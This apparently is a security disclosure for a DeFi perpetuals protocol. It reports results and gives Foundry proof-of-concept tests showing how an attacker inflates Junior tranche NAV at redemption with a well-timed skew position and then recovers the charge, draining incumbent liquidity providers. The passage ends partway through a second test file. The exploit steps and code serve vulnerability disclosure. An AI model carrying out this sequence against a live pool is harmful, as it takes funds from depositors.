Four test files are attached (`Hunt_N2c`, `Hunt_N2Final`, `Hunt_P3`, `Hunt_P3b`), both extending `BasePerpTest`. They use the real HousePool, both TrancheVaults, MarginClearinghouse, CfdEngine and PletherOracle.
- Only MockPyth and the mock USDG are mocked. There is no `vm.store`, `vm.etch` or `vm.mockCall`.
- Orders go through the V3 `OrderRouter.commitOrder(OrderV3Types.OrderRequest)`. The fixture router is `LegacyOrderRouterHarness is OrderRouter`, which inherits that function unchanged. A separate keeper executes the orders.
- Risk parameters follow DEPLOYMENT.md: 4 bp fee, confidence multiplier 2500, maximum confidence ratio 10 bp, minimum open notional 1,000.
- Every attack test runs against a control taken from the same snapshot, with the same LP timing and no trader leg, and asserts its result.
- The base fixture relaxes the Senior caps through `_bypassAllTimelocks`. This does not affect the result, because Senior never exceeds 80% and only Junior moves.
- The base fixture seeds the tranches with a router prank before any position exists.

### `Hunt_N2c.t.sol`: Scenario A (no organic skew). 10/10 pass
Run: `forge test --root packages/perps --match-path test/perps/Hunt_N2c.t.sol -vv`

| Test | Edge vs control (USDG) | Incumbent Junior loss |
|---|---|---|
| test_control | 0 (control nets −58.52, the normal coupon) | 0 |
| test_attack_f80_long / _short (Senior 4M, Junior 1M, attacker 4M LP, 3.5M position) | **+2,644.71** each | 4,044.91 |
| test_attack_conf2bps | +2,434.21 | 3,834.34 |
| test_attack_f50 | +422 | — |
| test_attack_repeated (4 cycles, 12 h) | Σ +10,620.20 | incumbent 998,369.17 → 981,943.81 (−1.65%) |
| test_stacked_withOrganicSkew (entry + exit) | +4,204 (entry +1,739, exit +2,404) | — |
| **test_release_scale_f80** (Senior 40M, Junior 10M, 35M position) | **+26,469.54 per cycle** | 40,469.74 |
| test_release_scale_f50 | +4,238.04 | 13,638.24 |
| **test_release_scale_daily** (11 cycles, ~33 h) | **Σ +294,994.96** | incumbent Junior **9,974,697.75 → 9,520,100.73 (−4.56%)** |

### `Hunt_N2Final.t.sol`: Scenario B (entry side with organic skew). 8/8 pass
Run: `forge test --root packages/perps --match-path test/perps/Hunt_N2Final.t.sol -vv`

Setup: organic 2M SHORT (40% of depth). The attacker deposits 4M Junior and opens a 1.5M skew-reducing LONG.

| Test | Result |
|---|---|
| Single cycle | edge **+1,797.00**; incumbent Junior loss 2,997.20 |
| With 2 bp confidence | edge +1,706.67 |
| ±5 bp move over the LP hold | edge unchanged at ≈+1,706; the price exposure has zero mean |
| 3 repeated cycles | edge Σ +5,401.79 |
| Passive test | an honest LP redeeming while an organic rebate is outstanding is short-changed by exactly its pro-rata share (1,872.75) |

### `Hunt_P3.t.sol` + `Hunt_P3b.t.sol`: Escalation with a persistent position (5/5 + 7/7 pass)
Setup: release params, including the 80% Senior share cap.
- The attacker keeps a long A (45M) open throughout.
- Right after its own Junior redemption settles, it opens a short hedge B and receives rebate `r`.
- It re-enters Junior one hour later at NAV − r, then closes B. The clamp makes B repay exactly `r`, so B costs fees only.
- It repeats every 3 h on weekdays.

Results:
- **Per cycle:** edge **+129,305**; incumbent Junior −1.65%.
- **One day (8 cycles):** edge +959.6k; incumbent Junior **−12.50%**.
- **Three weekdays:** incumbent Junior 9.94M → 6.62M (−32.9%).
- Senior is untouched in every run.
- **Scale-invariant:** a pool of 4M/1M with 7.5M of attacker capital shows the same 165 bps per cycle and 1,250 bps per day.
- **Hedgeable:** a ±1% basket move changes the edge vs control by only ±0.7%. A full-size short hedge cuts the remaining P&L swing by 99%.

Disclosure, depth: about 73% of P3's edge comes from the attacker's exit shrinking depth, so `r = kX²/(2D)` is larger. The remaining 27% persists at constant depth (`test_constantDepth`: +34,948.59 per cycle), and that part comes from the NAV exclusion alone.

This is not scan S30/S31 (scan md:1693-1699, 1742-1748). Those findings enlarge a trader's close rebate. Here no position performs a skew-reducing close at shrunk depth, the trader side nets **zero** lifetime VPI (the clamp sets B's close to exactly `r`), and value moves only between LPs through epoch pricing.

Disclosure, alert incumbents: an incumbent who requests redemption at the first signal loses about one cycle (167 bps) before exiting (`test_incumbentCanExit`). Passive incumbents keep losing every cycle.

### Identities asserted in every attack run
- The attacker's LP-leg gain equals the incumbent Junior loss (plus any confidence spread the attacker itself paid into the pool).
- Senior is unchanged.
- The trader leg's lifetime VPI is 0, so it pays fees only.

### How to run
Place each file (the two below, and `Hunt_N2Final.t.sol` from the appendix at the end of the Description) in `packages/perps/test/perps/` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (they extend the repo's `BasePerpTest`), then run:
```
forge test --root packages/perps --match-path test/perps/Hunt_N2c.t.sol -vv
forge test --root packages/perps --match-path test/perps/Hunt_N2Final.t.sol -vv
forge test --root packages/perps --match-path test/perps/Hunt_P3.t.sol -vv
```
Expected: `Hunt_N2c` 10/10 pass, `Hunt_N2Final` 8/8 and `Hunt_P3` 5/5. `Hunt_P3b.t.sol` (7/7: constant-depth, ±1% move, small-scale and incumbent-exit tests behind the escalation numbers) is ~32 KB and over the field limit, so it is available on request.

### Step-by-step (Scenario A)
1. On a flat book, the attacker deposits into the Junior TrancheVault (activates at fair NAV), waits out the 1 h cooldown, then requests a redemption for epoch T.
2. At T−70 s the attacker commits a skew-increasing order through `OrderRouter.commitOrder` (up to 40% of depth); an independent keeper executes it. HousePool books the VPI charge `C` as revenue, so NAV rises by `C`.
3. At T the attacker calls `router.settleLpEpoch`. Its redemption is funded at NAV + C.
4. The attacker fully closes the position. The lifetime clamp refunds exactly `C` from HousePool, so the trader leg's lifetime VPI is 0 and it has paid only 2 × 4 bp fees.
5. Result: the attacker's redemption proceeds exceed a same-snapshot control by f·C; the incumbent Junior is short by the same amount. The tests assert this.

### `test/perps/Hunt_N2c.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// N2c (pin a82d4fef) - MIRROR of N2, with NO organic skew requirement.
// A skew-INCREASING open pays a positive VPI charge C into pool cash, recorded as LP Revenue (CfdEngineSettlementSidecar
// executeOpen -> recordClaimantInflow(Revenue, CashArrived)). That cash is a certain-to-return liability: the same position
// closing back toward zero skew is a skew-reducing close whose fresh rebate is clamped to exactly -proportionalAccrual = -C
// (CloseAccountingLib.sol:103-118). VPI is excluded from the terminal NAV book, so while the position is open Junior NAV
// is OVERSTATED by C. An actor that holds a matured Junior redeem request opens a large skew-increasing position seconds
// before the LP epoch boundary, has its redeem priced at NAV + C, then closes and receives C back from the remaining LPs.
//
//   (1) T1-10min requestDeposit (Junior), settles at T1 with NO positions open (fair NAV)
//   (2) T1+1h+1s (cooldown) requestRedeem -> activates at T2
//   (3) T2-70s commitOrder(LONG X, skew-increasing from 0) ; T2-69s third-party keeper executes -> charge C into pool
//   (4) T2 attacker calls router.settleLpEpoch (permissionless keeper path) -> redeem priced at NAV + C
//   (5) T2+1s commitOrder(close) ; keeper executes -> close rebate == C (lifetime VPI 0), paid by remaining Junior
//
// Real HousePool, TrancheVault x2, MarginClearinghouse, CfdEngine, PletherOracle. Mocks: MockPyth + MockSettlementToken
// (out of scope). No vm.store/etch/mockCall. Owner: DEPLOYMENT.md release router/oracle params via the 72h timelock.

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "./BasePerpTest.sol";

abstract contract Hunt_N2cBase is BasePerpTest {

    address internal constant COUNTER = address(0x2C0); // organic flow (only used in the stacked test)
    address internal constant ATK_TR = address(0x2A71); // attacker trader account
    address internal constant ATK_LP = address(0x2A72); // attacker LP account (same entity)
    address internal constant KEEPER = address(0x2A73); // independent third-party keeper
    address internal constant HONEST = address(0x2B01); // honest Junior depositor (bystander scenario)

    uint256 internal constant P0 = 1e8;
    uint256 internal constant BP = 10_000;

    uint64 internal confRaw;

    struct Outcome {
        uint256 lpAssetsOut;
        int256 traderDelta;
        int256 attackerNet;
        uint256 incumbentJunior;
        uint256 incumbentSenior;
        int256 charge;
        uint256 navBeforeOpen;
        uint256 navAtSettle;
        uint256 navAfterClose;
        uint256 shares;
    }

    struct Cmp {
        int256 edge;
        int256 lpLegGain;
        int256 incumbentLoss;
        int256 seniorDiff;
        int256 charge;
        int256 traderDelta;
        int256 attackNet;
        int256 controlNet;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DEPLOYMENT.md "Initial release parameters"
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 4_000_000e6; // 80% of pool = release maxSeniorShareBps
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        assertEq(engine.executionFeeBps(), 4, "release exec fee 4 bps");
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        cfg.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(cfg);
        vm.deal(KEEPER, 10 ether);
        vm.deal(ATK_TR, 10 ether);
        _fundTrader(ATK_TR, 1_000_000e6);
        _fundTrader(COUNTER, 200_000e6);
        _refresh(P0);
        // NOTE: NO organic position. Market skew is exactly 0 before the attack.
    }

    // ------------------------------------------------------------------ public-path helpers

    function _pythData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes32[] memory ids = _basePythFeedIds();
        uint256 previous = engine.lastMarkTime();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), confRaw, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refresh(
        uint256 price
    ) internal {
        bytes[] memory d = _pythData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    /// Production V3 commit (the bounded-order surface a real frontend uses). Market order: no price limit.
    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 id) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(trader, block.timestamp, size, isClose)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        id = OrderRouter(payable(address(router))).commitOrder(req);
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal {
        bytes[] memory data = _pythData(price);
        vm.prank(KEEPER); // independent keeper; any open-order bounty it earns is a cost to the attacker
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _execute(_commit(trader, side, size, margin, isClose), price);
    }

    /// Permissionless epoch settlement via the Router keeper path, called by `caller` (any address).
    function _settleEpoch(
        address caller,
        uint256 price
    ) internal {
        bytes[] memory d = _pythData(price);
        vm.prank(caller);
        router.settleLpEpoch(d);
    }

    function _vpi(
        address a
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _size(
        address a
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _lpNav() internal view returns (uint256) {
        return juniorVault.totalAssets() + seniorVault.totalAssets();
    }

    /// Next epoch boundary T that still accepts requests at T-10min (request cutoff is T-5min).
    function _nextTarget() internal view returns (uint256 T) {
        T = ((block.timestamp + 15 minutes) / 1 hours + 1) * 1 hours;
    }

    // ------------------------------------------------------------------ one cycle

    /// size == 0 is the CONTROL (identical LP timing/prices, no trader leg).
    function _cycle(
        uint256 depositAssets,
        uint256 size,
        CfdTypes.Side side
    ) internal returns (Outcome memory o) {
        uint256 traderBefore = clearinghouse.balanceAssets(ATK_TR);
        uint256 T1 = _nextTarget();

        // (1) deposit at a boundary with the attacker flat (fair NAV)
        vm.warp(T1 - 10 minutes);
        _refresh(P0);
        settlementToken.mint(ATK_LP, depositAssets);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depId = juniorVault.requestDeposit(depositAssets, ATK_LP, ATK_LP);
        vm.stopPrank();
        assertEq(juniorVault.depositEpochStart(depId), T1, "deposit activates at T1");
        vm.warp(T1 - 1);
        _settleEpoch(ATK_TR, P0);
        vm.prank(ATK_LP);
        o.shares = juniorVault.claimDepositShares(depId);

        // (2) after the 1h cooldown request the full redeem
        vm.warp(T1 + 1 hours + 1);
        _refresh(P0);
        vm.prank(ATK_LP);
        uint256 redId = juniorVault.requestRedeem(o.shares, ATK_LP, ATK_LP);
        uint256 T2 = pool.lpEpochStart(redId);

        // (3) T2-70s: skew-INCREASING open -> positive VPI charge into pool cash
        vm.warp(T2 - 70);
        _refresh(P0);
        o.navBeforeOpen = _lpNav();
        if (size != 0) {
            _execute(_commit(ATK_TR, side, size, size / 1e12 * 200 / 10_000, false), P0);
            o.charge = _vpi(ATK_TR);
            assertGt(o.charge, 0, "open paid a positive VPI charge");
            assertLt(block.timestamp, T2, "open before boundary");
        }

        // (4) T2: attacker settles the epoch itself (permissionless Router path)
        vm.warp(T2 - 1);
        _settleEpoch(ATK_TR, P0);
        assertEq(block.timestamp, T2);
        o.navAtSettle = _lpNav();
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, ATK_LP);
        assertEq(claimable, o.shares, "redeem fully funded");
        vm.prank(ATK_LP);
        o.lpAssetsOut = juniorVault.claimRedeem(redId, claimable, ATK_LP, ATK_LP);

        // (5) close: skew-reducing close, fresh rebate clamped to exactly the accrued charge
        if (size != 0) {
            _execute(_commit(ATK_TR, side, size, 0, true), P0);
            assertEq(_size(ATK_TR), 0, "trader flat");
        } else {
            _refresh(P0);
        }
        o.navAfterClose = _lpNav();

        o.traderDelta = int256(clearinghouse.balanceAssets(ATK_TR)) - int256(traderBefore);
        o.attackerNet = int256(o.lpAssetsOut) - int256(depositAssets) + o.traderDelta;
        o.incumbentJunior = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        o.incumbentSenior = seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _log(string memory tag, Outcome memory o) internal pure {
        console2.log(tag);
        console2.log("  VPI charge (vpiAccrued after open)");
        console2.logInt(o.charge);
        console2.log("  LP NAV before open / at settle / after close", o.navBeforeOpen, o.navAtSettle, o.navAfterClose);
        console2.log("  shares / LP assets out", o.shares, o.lpAssetsOut);
        console2.log("  trader clearinghouse delta (fees, bounty, carry, VPI round trip)");
        console2.logInt(o.traderDelta);
        console2.log("  ATTACKER NET");
        console2.logInt(o.attackerNet);
        console2.log("  incumbent junior / senior value", o.incumbentJunior, o.incumbentSenior);
    }

    function _attackVsControl(
        string memory tag,
        uint256 depositAssets,
        uint256 size,
        CfdTypes.Side side
    ) internal returns (Cmp memory r) {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _cycle(depositAssets, 0, side);
        vm.revertToState(snap);
        Outcome memory a = _cycle(depositAssets, size, side);
        console2.log("==========", tag);
        _log("CONTROL", c);
        _log("ATTACK", a);
        r.edge = a.attackerNet - c.attackerNet;
        r.lpLegGain = int256(a.lpAssetsOut) - int256(c.lpAssetsOut);
        r.incumbentLoss = int256(c.incumbentJunior) - int256(a.incumbentJunior);
        r.seniorDiff = int256(a.incumbentSenior) - int256(c.incumbentSenior);
        r.charge = a.charge;
        r.traderDelta = a.traderDelta;
        r.attackNet = a.attackerNet;
        r.controlNet = c.attackerNet;
        console2.log("EDGE (attack net - control net)");
        console2.logInt(r.edge);
        console2.log("LP-leg gain vs control");
        console2.logInt(r.lpLegGain);
        console2.log("incumbent Junior loss vs control");
        console2.logInt(r.incumbentLoss);
        console2.log("incumbent Senior diff vs control");
        console2.logInt(r.seniorDiff);
    }

    function _assertTransfer(Cmp memory r) internal pure {
        assertGt(r.edge, 0, "net-profitable after all costs");
        assertGt(r.incumbentLoss, 0, "incumbent Junior pays");
        assertEq(r.edge, r.lpLegGain + r.traderDelta, "edge decomposition");
        assertApproxEqAbs(r.seniorDiff, 0, 2e6, "Senior unaffected");
    }

}

contract Hunt_N2cTest is Hunt_N2cBase {

    // ------------------------------------------------------------------ tests

    function test_control() public {
        uint256 incBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        Outcome memory c = _cycle(4_000_000e6, 0, CfdTypes.Side.LONG);
        _log("CONTROL", c);
        assertLe(c.attackerNet, 0, "plain LP round trip not profitable");
        assertApproxEqRel(c.incumbentJunior, incBefore, 0.0001e18, "incumbent unchanged");
    }

    function test_attack_f80_long() public {
        // depth ~9M after deposit; 3.5M long = 38.9% (< 40% cap)
        Cmp memory r = _attackVsControl("f=0.8 LONG 3.5M", 4_000_000e6, 3_500_000e18, CfdTypes.Side.LONG);
        _assertTransfer(r);
    }

    function test_attack_f80_short() public {
        Cmp memory r = _attackVsControl("f=0.8 SHORT 3.5M", 4_000_000e6, 3_500_000e18, CfdTypes.Side.SHORT);
        _assertTransfer(r);
    }

    function test_attack_f50() public {
        // depth ~6M; 2.35M = 39%
        Cmp memory r = _attackVsControl("f=0.5 LONG 2.35M", 1_000_000e6, 2_350_000e18, CfdTypes.Side.LONG);
        _assertTransfer(r);
    }

    function test_attack_conf2bps() public {
        confRaw = uint64(2 * BP);
        Cmp memory r = _attackVsControl("f=0.8 LONG 3.5M conf 2bps", 4_000_000e6, 3_500_000e18, CfdTypes.Side.LONG);
        _assertTransfer(r);
    }

    function test_attack_repeated() public {
        uint256 incStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        int256 total;
        for (uint256 i; i < 4; ++i) {
            Cmp memory r = _attackVsControl("CYCLE", 4_000_000e6, 3_500_000e18, CfdTypes.Side.LONG);
            _assertTransfer(r);
            total += r.edge;
        }
        uint256 incEnd = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        console2.log("total edge over 4 cycles");
        console2.logInt(total);
        console2.log("incumbent junior start / end", incStart, incEnd);
        assertLt(incEnd, incStart, "incumbent bled");
    }


    /// Full sandwich when organic skew DOES exist: N2 entry dip (skew-reducing open outstanding at the deposit boundary)
    /// stacked with the N2c exit inflation (skew-increasing open outstanding at the redeem boundary).
    function _stacked(uint256 depositAssets, uint256 entryLong, uint256 exitSize) internal returns (int256 net, uint256 inc) {
        uint256 trBefore = clearinghouse.balanceAssets(ATK_TR);
        uint256 T1 = _nextTarget();
        vm.warp(T1 - 10 minutes);
        _refresh(P0);
        settlementToken.mint(ATK_LP, depositAssets);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depId = juniorVault.requestDeposit(depositAssets, ATK_LP, ATK_LP);
        vm.stopPrank();
        vm.warp(T1 - 70);
        _refresh(P0);
        if (entryLong != 0) _execute(_commit(ATK_TR, CfdTypes.Side.LONG, entryLong, 20_000e6, false), P0);
        vm.warp(T1 - 1);
        _settleEpoch(ATK_TR, P0);
        if (entryLong != 0) _execute(_commit(ATK_TR, CfdTypes.Side.LONG, entryLong, 0, true), P0);
        vm.prank(ATK_LP);
        uint256 shares = juniorVault.claimDepositShares(depId);
        vm.warp(T1 + 1 hours + 1);
        _refresh(P0);
        vm.prank(ATK_LP);
        uint256 redId = juniorVault.requestRedeem(shares, ATK_LP, ATK_LP);
        uint256 T2 = pool.lpEpochStart(redId);
        vm.warp(T2 - 70);
        _refresh(P0);
        if (exitSize != 0) _execute(_commit(ATK_TR, CfdTypes.Side.SHORT, exitSize, exitSize / 1e12 * 200 / 10_000, false), P0);
        vm.warp(T2 - 1);
        _settleEpoch(ATK_TR, P0);
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, ATK_LP);
        assertEq(claimable, shares, "redeem fully funded");
        vm.prank(ATK_LP);
        uint256 out = juniorVault.claimRedeem(redId, claimable, ATK_LP, ATK_LP);
        if (exitSize != 0) _execute(_commit(ATK_TR, CfdTypes.Side.SHORT, exitSize, 0, true), P0);
        net = int256(out) - int256(depositAssets) + int256(clearinghouse.balanceAssets(ATK_TR)) - int256(trBefore);
        inc = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function test_stacked_withOrganicSkew() public {
        // organic 2M short = 40% of the 5M pre-deposit depth; after the 4M deposit depth ~9M -> exit short may add ~1.5M
        _execute(_commit(COUNTER, CfdTypes.Side.SHORT, 2_000_000e18, 100_000e6, false), P0);
        uint256 snap = vm.snapshotState();
        (int256 c, uint256 incC) = _stacked(4_000_000e6, 0, 0);
        vm.revertToState(snap);
        (int256 entryOnly, uint256 incE) = _stacked(4_000_000e6, 1_500_000e18, 0);
        vm.revertToState(snap);
        (int256 exitOnly, uint256 incX) = _stacked(4_000_000e6, 0, 1_500_000e18);
        vm.revertToState(snap);
        (int256 both, uint256 incB) = _stacked(4_000_000e6, 1_500_000e18, 1_500_000e18);
        console2.log("STACKED (organic 2M short) attacker net: control / entry-dip only / exit-inflate only / both");
        console2.logInt(c);
        console2.logInt(entryOnly);
        console2.logInt(exitOnly);
        console2.logInt(both);
        console2.log("incumbent junior: control / entry / exit / both", incC, incE);
        console2.log("                                             ", incX, incB);
        assertGt(both - c, entryOnly - c, "stacking beats entry-only");
        assertGt(both - c, exitOnly - c, "stacking beats exit-only");
        assertLt(incB, incC, "incumbent pays");
    }

}

/// Same attack at DEPLOYMENT.md release scale: Senior 40M (cap, 80%), Junior 10M.
contract Hunt_N2cScaleTest is Hunt_N2cBase {

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 40_000_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function test_release_scale_f80() public {
        // attacker deposits 40M Junior (f=0.8); depth ~90M; 35M long = 38.9% skew
        Cmp memory r = _attackVsControl("RELEASE SCALE f=0.8 LONG 35M", 40_000_000e6, 35_000_000e18, CfdTypes.Side.LONG);
        _assertTransfer(r);
    }

    function test_release_scale_f50() public {
        // attacker deposits 10M (f=0.5); depth ~60M; 23.5M long = 39%
        Cmp memory r = _attackVsControl("RELEASE SCALE f=0.5 LONG 23.5M", 10_000_000e6, 23_500_000e18, CfdTypes.Side.LONG);
        _assertTransfer(r);
    }

    function test_release_scale_daily() public {
        // 11 back-to-back cycles (one LP account, ~2h10m each => ~24h). Alternating two LP accounts doubles cadence.
        uint256 incStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        int256 total;
        for (uint256 i; i < 11; ++i) {
            Cmp memory r = _attackVsControl("DAY CYCLE", 40_000_000e6, 35_000_000e18, CfdTypes.Side.LONG);
            _assertTransfer(r);
            total += r.edge;
        }
        uint256 incEnd = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        console2.log("RELEASE SCALE ~24h: total attacker edge");
        console2.logInt(total);
        console2.log("incumbent junior start / end / timestamp", incStart, incEnd, block.timestamp);
    }

}

```

### `test/perps/Hunt_P3.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// P3 (pin a82d4fef) - upper bound of the N2/N2c "VPI outside LP NAV" transfer.
//
// New construction found here ("self-skew + depth-shrink entry dip"):
//   * Attacker keeps ONE persistent skew position A (long X) open. It is the "organic skew" N2 needed.
//   * E   : attacker's Junior redeem settles (attacker leaves -> pool depth shrinks from D_big to D_small).
//   * E+1s: attacker opens hedge B (short X, skew-REDUCING) at D_small -> rebate r = k X^2 / (2 D_small), paid in cash
//           by the pool. Net skew 0, so the attacker has NO price exposure while out of the pool.
//   * E+1h: attacker's Junior deposit settles at NAV deflated by r (VPI outside the NAV book).
//   * E+1h+: attacker closes B (skew-increasing back to X at D_big). The lifetime clamp
//           (CloseAccountingLib.sol:116-117) forces B to repay EXACTLY r -> B's lifetime VPI = 0, cost = fees only.
//           Pool cash recovers r, which now accrues pro-rata to the attacker's cheap shares.
//   * E+2h+1s: request redeem (cooldown is from activation, TrancheVault.sol:1109) -> E' = E+3h. Repeat.
// The rebate is computed at the SHRUNK depth (attacker out) while being repaid after the attacker is back in, and r
// grows ~ (attacker capital)^2 / D_small. Bounded by the free-asset check at exit (D_small >= ~X) and by the release
// 80% senior-share ratio cap (Junior can never be withdrawn below seniorExposure/4), which also shields Senior.
//
// Real HousePool / TrancheVault x2 / MarginClearinghouse / CfdEngine(+sidecar) / PletherOracle / OrderRouter.
// Mocks: MockPyth + MockSettlementToken (out of scope). No vm.store / vm.etch / vm.mockCall.
// Owner actions: DEPLOYMENT.md release parameters only (router conf params; HousePool $40M / 8,000 bps senior limits).

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "./BasePerpTest.sol";

contract Hunt_P3Test is BasePerpTest {

    address internal constant ATK_TR = address(0x3A71); // attacker trader account
    address internal constant ATK_LP = address(0x3A72); // attacker LP account
    address internal constant KEEPER = address(0x3A73); // third-party keeper
    address internal constant TR2 = address(0x3A74); // second attacker trader account (two-leg tests)

    uint256 internal constant P0 = 1e8;

    struct Run {
        uint256 incJStart;
        uint256 incJEnd;
        uint256 incSStart;
        uint256 incSEnd;
        uint256 atkStart;
        uint256 atkEnd;
        uint256 minted;
        uint256 keptShares;
        uint256 seniorPrincipalEnd;
        uint256 seniorHwmEnd;
        uint256 treasuryGain;
    }

    // ------------------------------------------------------------------ config

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({ // DEPLOYMENT.md "Initial release parameters"
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 40_000_000e6; // release senior cap
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6; // senior = 80% of pool (release maxSeniorShareBps)
    }

    function setUp() public override {
        super.setUp();
        assertEq(engine.executionFeeBps(), 4, "release exec fee 4 bps");
        // Release HousePool senior limits ($40M / 80%) instead of the test fixture's 9,999 bps (same timelock window).
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(pc);
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        cfg.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(cfg); // warps 72h+1
        assertLe(pool.poolConfigActivationTime(), block.timestamp, "pool config timelock elapsed");
        _refresh(P0);
        pool.finalizePoolConfig();
        assertEq(pool.maxSeniorShareBps(), 8000);
        vm.deal(KEEPER, 10 ether);
        vm.deal(ATK_TR, 10 ether);
        vm.deal(TR2, 10 ether);
        _fundTrader(ATK_TR, 3_000_000e6);
        _fundTrader(TR2, 3_000_000e6);
        _refresh(P0);
    }

    // ------------------------------------------------------------------ public-path helpers

    function _pythData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes32[] memory ids = _basePythFeedIds();
        uint256 previous = engine.lastMarkTime();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refresh(
        uint256 price
    ) internal {
        bytes[] memory d = _pythData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 id) {
        uint256 window = router.maxExecutionWindowSeconds();
